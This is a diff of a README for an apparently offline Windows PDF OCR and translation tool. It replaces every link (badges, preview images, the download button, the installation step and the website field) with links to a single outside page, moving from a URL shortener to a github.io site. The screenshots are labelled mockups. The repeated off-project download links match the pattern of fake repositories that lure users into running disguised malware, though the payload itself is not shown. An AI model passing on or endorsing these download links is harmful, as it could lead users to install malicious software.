@@ -8,30 +8,30 @@ Offline PDF OCR Translator for Windows — extract text from scanned PDFs and im
 
 ## Quick Access
 
-[![Offline](https://img.shields.io/badge/Offline-Local%20Processing-1f883d?style=for-the-badge)](https://flyn.co/17yeN7/)
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0969da?style=for-the-badge)](https://flyn.co/17yeN7/)
-[![Batch](https://img.shields.io/badge/Batch-Profiles-8250df?style=for-the-badge)](https://flyn.co/17yeN7/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-2f81f7?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Offline](https://img.shields.io/badge/Offline-Local%20Processing-1f883d?style=for-the-badge)](https://trainedhierar.github.io/)
+[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0969da?style=for-the-badge)](https://trainedhierar.github.io/)
+[![Batch](https://img.shields.io/badge/Batch-Profiles-8250df?style=for-the-badge)](https://trainedhierar.github.io/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-2f81f7?style=for-the-badge)](https://trainedhierar.github.io/)
 
 ---
 
 ## Download
 
-➡️ **[Download Windows Build](https://flyn.co/17yeN7/)**
+➡️ **[Download Windows Build](https://trainedhierar.github.io/)**
 
 ---
 
 ## Preview
 
-[![Preview](assets/preview.png)](https://flyn.co/17yeN7/)
+[![Preview](assets/preview.png)](https://trainedhierar.github.io/)
 
 ### Dashboard
 
-[![Dashboard](assets/dashboard.png)](https://flyn.co/17yeN7/)
+[![Dashboard](assets/dashboard.png)](https://trainedhierar.github.io/)
 
 ### Feature Overview
 
-[![Features](assets/features.png)](https://flyn.co/17yeN7/)
+[![Features](assets/features.png)](https://trainedhierar.github.io/)
 
 > Images are project interface mockups.
 
@@ -89,7 +89,7 @@ Custom
 
 ## Installation
 
-1. Download the latest package: **[Download Latest Version](https://flyn.co/17yeN7/)**
+1. Download the latest package: **[Download Latest Version](https://trainedhierar.github.io/)**
 2. Extract it to a normal folder.
 3. Launch the desktop application.
 4. Add a source file or folder.
@@ -136,7 +136,7 @@ Platform: Windows x64
 Type: Offline Desktop Utility
 Focus: local translation / glossary / batch PDFs
 Processing: Local-first
-Website: https://flyn.co/17yeN7/
+Website: https://trainedhierar.github.io/
 ```
 
 ---
